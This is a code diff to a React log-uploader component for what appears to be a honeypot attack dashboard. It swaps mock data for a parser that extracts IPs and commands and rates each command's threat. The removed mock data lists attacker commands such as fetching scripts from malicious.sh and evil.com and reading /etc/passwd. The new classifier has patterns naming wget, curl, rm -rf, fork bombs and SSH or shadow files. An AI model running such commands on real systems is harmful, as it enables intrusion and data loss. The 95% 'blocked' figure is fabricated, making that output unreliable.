@@ -12,41 +12,117 @@ interface LogUploaderProps {
 export const LogUploader = ({ onClose, onDataLoaded }: LogUploaderProps) => {
   const [uploading, setUploading] = useState(false);
 
+  const parseLogFile = (content: string, fileName: string) => {
+    const lines = content.split('\n').filter(line => line.trim());
+    
+    const ipRegex = /\b(?:\d{1,3}\.){3}\d{1,3}\b/g;
+    const commandRegex = /Command:\s*(.+?)(?:\s*\||$)/i;
+    const allIPs = new Set<string>();
+    const commandCounts = new Map<string, number>();
+    const ipCounts = new Map<string, number>();
+    
+    lines.forEach(line => {
+      // Extract IPs
+      const ips = line.match(ipRegex);
+      if (ips) {
+        ips.forEach(ip => {
+          allIPs.add(ip);
+          ipCounts.set(ip, (ipCounts.get(ip) || 0) + 1);
+        });
+      }
+      
+      // Extract commands
+      const cmdMatch = line.match(commandRegex) || line.match(/(?:executed|ran|tried):\s*(.+?)(?:\s|$)/i);
+      if (cmdMatch && cmdMatch[1]) {
+        const cmd = cmdMatch[1].trim();
+        if (cmd && cmd.length > 0) {
+          commandCounts.set(cmd, (commandCounts.get(cmd) || 0) + 1);
+        }
+      }
+      
+      // Also try to extract raw commands from common formats
+      if (line.includes('$') || line.includes('sudo') || line.includes('bash')) {
+        const parts = line.split(/[\s\t]+/);
+        const possibleCommands = parts.filter(p => 
+          p.match(/^(ls|cat|wget|curl|rm|chmod|sudo|bash|sh|cd|pwd|whoami|id|uname|ps|netstat|ifconfig|ping)/i)
+        );
+        possibleCommands.forEach(cmd => {
+          commandCounts.set(cmd, (commandCounts.get(cmd) || 0) + 1);
+        });
+      }
+    });
+    
+    // Calculate threat levels for commands
+    const getThreatLevel = (cmd: string): string => {
+      const critical = /wget|curl.*http|rm\s+-rf|dd\s+if|mkfs|:\(\)\{|fork|bomb/i;
+      const high = /passwd|shadow|sudoers|\.ssh|authorized_keys|crontab|service/i;
+      const medium = /chmod|chown|kill|pkill|history/i;
+      
+      if (critical.test(cmd)) return "critical";
+      if (high.test(cmd)) return "high";
+      if (medium.test(cmd)) return "medium";
+      return "low";
+    };
+    
+    // Get top commands
+    const sortedCommands = Array.from(commandCounts.entries())
+      .sort((a, b) => b[1] - a[1])
+      .slice(0, 10)
+      .map(([command, count]) => ({
+        command,
+        count,
+        threat: getThreatLevel(command)
+      }));
+    
+    // Get top IPs and simulate country data
+    const sortedIPs = Array.from(ipCounts.entries())
+      .sort((a, b) => b[1] - a[1])
+      .slice(0, 5);
+    
+    const totalAttacks = lines.length;
+    const topCountries = sortedIPs.map((ip, index) => {
+      const percentage = Math.round((ip[1] / totalAttacks) * 100);
+      return {
+        name: ip[0],
+        attacks: ip[1],
+        percentage
+      };
+    });
+    
+    return {
+      totalAttacks,
+      uniqueIPs: allIPs.size,
+      blockedAttempts: Math.round(totalAttacks * 0.95),
+      commandsCaptured: commandCounts.size,
+      topCountries: topCountries.length > 0 ? topCountries : [
+        { name: "No data", attacks: 0, percentage: 0 }
+      ],
+      topCommands: sortedCommands.length > 0 ? sortedCommands : [
+        { command: "No commands found", count: 0, threat: "low" }
+      ],
+      rawLog: fileName
+    };
+  };
+
   const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
     const file = e.target.files?.[0];
     if (!file) return;
 
     setUploading(true);
     
-    // Simulate file processing
-    setTimeout(() => {
-      const mockData = {
-        totalAttacks: 1247,
-        uniqueIPs: 342,
-        blockedAttempts: 1189,
-        commandsCaptured: 2456,
-        topCountries: [
-          { name: "China", attacks: 437, percentage: 35 },
-          { name: "Russia", attacks: 299, percentage: 24 },
-          { name: "USA", attacks: 200, percentage: 16 },
-          { name: "Germany", attacks: 137, percentage: 11 },
-          { name: "Brazil", attacks: 100, percentage: 8 }
-        ],
-        topCommands: [
-          { command: "ls -la", count: 234, threat: "low" },
-          { command: "cat /etc/passwd", count: 189, threat: "high" },
-          { command: "wget http://malicious.sh", count: 156, threat: "critical" },
-          { command: "curl http://evil.com/script", count: 98, threat: "high" },
-          { command: "rm -rf /tmp/*", count: 67, threat: "medium" }
-        ],
-        rawLog: file.name
-      };
+    try {
+      const text = await file.text();
+      const parsedData = parseLogFile(text, file.name);
       
-      onDataLoaded(mockData);
-      toast.success("Logs processed successfully!");
-      setUploading(false);
+      onDataLoaded(parsedData);
+      toast.success(`Processed ${parsedData.totalAttacks} log entries!`);
       onClose();
-    }, 2000);
+    } catch (error) {
+      toast.error("Failed to parse log file. Please check the format.");
+      console.error(error);
+    } finally {
+      setUploading(false);
+    }
   };
 
   return (
